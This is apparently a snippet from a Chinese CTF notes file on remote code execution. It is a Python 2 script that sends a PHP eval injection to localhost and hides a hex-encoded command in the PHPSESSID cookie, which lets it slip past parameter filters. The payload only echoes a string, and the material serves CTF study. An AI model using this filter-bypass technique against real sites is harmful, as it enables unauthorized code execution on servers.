# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/命令执行.md
# TITLE: 什么是rce
# CATEGORY: web

import requests
url = 'http://localhost/?code=eval(hex2bin(session_id(session_start())));'
payload = "echo 'sky cool';".encode('hex')
cookies = {
    'PHPSESSID':payload
}
r = requests.get(url=url,cookies=cookies)
print r.content
